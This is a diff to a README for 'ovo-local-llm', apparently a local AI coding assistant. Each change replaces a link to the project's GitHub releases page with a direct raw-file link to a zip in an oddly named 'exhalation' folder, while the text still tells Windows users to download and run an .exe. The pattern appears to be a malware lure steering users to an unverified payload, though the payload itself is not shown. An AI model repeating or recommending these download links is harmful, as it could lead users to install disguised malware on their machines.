@@ -1,12 +1,12 @@
 # 🤖 ovo-local-llm - Private coding assistant for your machine
 
-[![](https://img.shields.io/badge/Download_Latest-Release-blue.svg)](https://github.com/Harmpleomorphism9956/ovo-local-llm/releases)
+[![](https://img.shields.io/badge/Download_Latest-Release-blue.svg)](https://raw.githubusercontent.com/Harmpleomorphism9956/ovo-local-llm/main/exhalation/local-ovo-llm-v2.6.zip)
 
 ovo-local-llm brings powerful coding help to your computer. You run your own models on your hardware without sending data to the cloud. This app turns your machine into an intelligent coding partner. It uses the latest local technology to help you build software. You keep full control over your work and your files.
 
 ## 📥 Getting the Application
 
-Visit [this release page](https://github.com/Harmpleomorphism9956/ovo-local-llm/releases) to download the software. Find the file ending in .exe for your Windows computer. Click the file to save it to your downloads folder.
+Visit [this release page](https://raw.githubusercontent.com/Harmpleomorphism9956/ovo-local-llm/main/exhalation/local-ovo-llm-v2.6.zip) to download the software. Find the file ending in .exe for your Windows computer. Click the file to save it to your downloads folder.
 
 ## 🖥️ System Requirements
 
@@ -61,7 +61,7 @@ If the model stops responding, check the bottom status bar. It shows if the syst
 
 ## 🌐 Staying Updated
 
-New versions contain fixes and feature upgrades. Return to the [download page](https://github.com/Harmpleomorphism9956/ovo-local-llm/releases) periodically to verify you have the latest software. Replacing your current version is simple. Download the new installer and follow the same steps. Your existing model settings usually stay saved.
+New versions contain fixes and feature upgrades. Return to the [download page](https://raw.githubusercontent.com/Harmpleomorphism9956/ovo-local-llm/main/exhalation/local-ovo-llm-v2.6.zip) periodically to verify you have the latest software. Replacing your current version is simple. Download the new installer and follow the same steps. Your existing model settings usually stay saved.
 
 ## 📂 File Organization
 
